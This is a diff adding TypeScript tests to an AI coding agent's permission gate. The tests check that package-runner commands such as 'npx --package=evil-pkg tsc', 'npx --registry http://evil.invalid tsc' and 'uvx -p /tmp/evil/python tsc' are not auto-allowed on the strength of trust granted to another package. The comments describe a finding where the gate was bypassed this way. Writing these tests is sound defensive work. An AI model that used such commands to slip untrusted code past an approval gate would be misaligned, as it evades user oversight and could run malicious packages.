@@ -1466,3 +1466,138 @@ describe("P15: the write bar is not the read bar", () => {
     expect((await decide({ type: "bash", command: "ls ~/.pi/agent", cwd }, store)).kind).toBe("auto-allow");
   });
 });
+
+// ──────────────────────────────────────────────────────────────────────
+// P16 (3.39.0, G7): what a run form EXECUTES is decided by its options, and
+// D10 was answering with the package list alone. The scan read "the first word
+// after the flags", so `npx --package=evil-pkg tsc` — which fetches evil-pkg and
+// runs `tsc` from inside it — was vouched for by Trust for `tsc`, a package the
+// command never fetched (the 2026-10-17 round-7 finding). uv's options were
+// three separate hand-written flag lists that had already drifted. The rule now:
+// every fetched package is named (FETCH_PKG_SELECT, per family), and uv's option
+// space is a closed world — one arity table (`UV_VALUE_FLAGS`) plus the benign
+// classes in config/trusted-scripts.ts. An option that widens the install set,
+// points at a project/config/env file or picks an interpreter by path is not
+// benign, and nothing about package trust can vouch for it.
+// ──────────────────────────────────────────────────────────────────────
+describe("P16: a runner's options are part of what the grant vouches for", () => {
+  const skillsScript = path.join(os.homedir(), ".pi", "agent", "skills", "pdf", "scripts", "pdf_extract.py");
+
+  function trustStore(pkgs: string[]) {
+    const store = createStore();
+    for (const p of pkgs) store.trustPackage(p);
+    return store;
+  }
+
+  it("a package-select flag's value is the fetch — trust for the run command does not cover it", async () => {
+    // `tsc` and `typescript` are both trusted; the fetches below are neither.
+    const store = trustStore(["tsc", "typescript"]);
+    for (const cmd of [
+      "npx --package=evil-pkg tsc",
+      "npx -p evil-pkg tsc",
+      "npm exec --package evil-pkg -- tsc",
+      "npx --package a --package b cmd",
+      'npx -p "$PKG" tsc', // no name to gate on: fails closed, no Always offered
+      // The npm-family coarse-grant half of this stays open on purpose: an
+      // "Always" here stores `npx tsc`, which prefix-covers the select-flag
+      // form. Measured, documented as the G12 limit in docs/dspa-redesign.md.
+    ]) {
+      const d = await decide({ type: "bash", command: cmd, cwd }, store);
+      expect(d.kind, cmd).not.toBe("auto-allow");
+    }
+  });
+
+  it("an option the family does not model still cannot smuggle a fetch", async () => {
+    // Honest limit (docs/dspa-redesign.md §6): npm-family options are not
+    // vetted by name in G7 — but the unmodelled flag's value lands in the fetch
+    // set, so the command names a package no Trust can hold and prompts.
+    const store = trustStore(["tsc", "typescript"]);
+    for (const cmd of [
+      "npx --cache /tmp/evil-cache tsc",
+      "npx --registry http://evil.invalid tsc",
+      "pnpm dlx --registry http://evil.invalid tsc",
+    ]) {
+      const d = await decide({ type: "bash", command: cmd, cwd }, store);
+      expect(d.kind, cmd).not.toBe("auto-allow");
+    }
+  });
+
+  it("uv: an option that chooses the code is not covered by package trust", async () => {
+    const store = trustStore(["tsc"]);
+    for (const cmd of [
+      "uvx --from evil-pkg tsc", // the select flag: the fetch is evil-pkg, not tsc
+      "uvx --from=evil-pkg tsc",
+      "uvx --with evil-pkg tsc", // extra code in the environment
+      "uvx -p /tmp/evil/python tsc", // interpreter by path (uv's -p is --python)
+      "uv tool run evil-pkg tsc", // the two-word form is uvx, gated like it
+    ]) {
+      const d = await decide({ type: "bash", command: cmd, cwd }, store);
+      expect(d.kind, cmd).not.toBe("auto-allow");
+    }
+  });
+
+  it("cost side: the everyday benign forms still auto-allow", async () => {
+    const store = trustStore(["tsc", "typescript"]);
+    for (const cmd of [
+      "npx tsc --noEmit",
+      "npx -p typescript tsc",
+      "npx -y typescript tsc",
+      "uvx tsc",
+      "uvx --python 3.12 tsc", // an interpreter VERSION is an identity item
+      "uvx --python=3.12 tsc",
+      "uvx -p3.12 tsc",
+    ]) {
+      const d = await decide({ type: "bash", command: cmd, cwd }, store);
+      expect(d.kind, cmd).toBe("auto-allow");
+    }
+  });
+
+  it("the trusted-script umbrella survives benign uv options and dies on unknown ones", async () => {
+    // `--color never` was read as the payload by the operand scan (its flag list
+    // lacked --color), so the umbrella — and the everyday skill call — broke.
+    const benign = [
+      "uv run --color never --frozen",
+      "uv run --with pymupdf",
+      "uv run --python 3.12",
+    ];
+    for (const head of benign) {
+      const d = await decide({ type: "bash", command: `${head} python3 ${skillsScript}`, cwd }, createStore());
+      expect(d.kind, head).toBe("auto-allow");
+    }
+    // -P is --upgrade-package, not -p/--python: folding the case made uv's
+    // install set look like a vetted version string.
+    for (const head of ["uv run -P pandas", "uv run --some-unknown-flag"]) {
+      const d = await decide({ type: "bash", command: `${head} python3 ${skillsScript}`, cwd }, createStore());
+      expect(d.kind, head).not.toBe("auto-allow");
+    }
+  });
+
+  it("an option value that decides what runs is inside the grant identity", async () => {
+    // The generic flag-name rule made `uvx -p /tmp/evil/python tsc`'s signature
+    // `uvx -p`: an "Always" stored a grant for an interpreter that is a path.
+    // Closed here — measured pre-fix auto-allow for every row below.
+    const cases: Array<[string, string[], string[]]> = [
+      ["uvx -p /tmp/evil/python tsc", ["uvx -p"], ["tsc"]],
+      ["uvx --from evil-pkg tsc", ["uvx --from"], []],
+      ["uvx --with evil-pkg tsc", ["uvx --with"], ["tsc"]],
+    ];
+    for (const [cmd, sigs, pkgs] of cases) {
+      const store = trustStore(pkgs);
+      store.addAllowed({ bashSigs: sigs });
+      const d = await decide({ type: "bash", command: cmd, cwd }, store);
+      expect(d.kind, `${cmd} under ${sigs.join(",")}`).not.toBe("auto-allow");
+    }
+    // The coarse rule still covers the form with nothing to name (`uvx tsc` →
+    // `uvx`), and a grant stored by "Always" now names the value it saw, so it
+    // no longer covers a DIFFERENT interpreter — pre-fix the sig was `uvx -p`,
+    // which every path value shared. (Re-approval of the identical command is
+    // the accepted cost of the sig-text change.)
+    const coarse = trustStore(["tsc"]);
+    coarse.addAllowed({ bashSigs: ["uvx"] });
+    expect((await decide({ type: "bash", command: "uvx tsc", cwd }, coarse)).kind).toBe("auto-allow");
+    const valued = trustStore(["tsc"]);
+    valued.addAllowed({ bashSigs: ["uvx --python 3.12"] });
+    expect((await decide({ type: "bash", command: "uvx --python 3.12 tsc", cwd }, valued)).kind).toBe("auto-allow");
+    expect((await decide({ type: "bash", command: "uvx --python /tmp/evil/python tsc", cwd }, valued)).kind).not.toBe("auto-allow");
+  });
+});
